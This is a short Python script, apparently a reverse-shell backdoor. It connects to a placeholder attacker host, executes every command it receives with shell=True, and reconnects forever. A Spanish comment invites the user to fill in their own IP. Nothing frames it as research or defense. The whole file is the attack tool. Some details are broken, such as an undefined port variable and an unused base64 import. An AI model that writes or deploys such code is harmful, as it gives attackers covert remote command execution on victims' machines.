import socket
import subprocess
import os
from time import sleep, time
from base64 import decode

def netcat(hostname, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))
    while 1:
        data = s.recv(1024)
        if data == "":
            pass
       
        subprocess.call(data.decode(), shell=True)

while True:
	try:
		netcat("ip", port) # SUSTITUIR QUE OS VEO (-. -)zZz
	except:
		sleep(1)
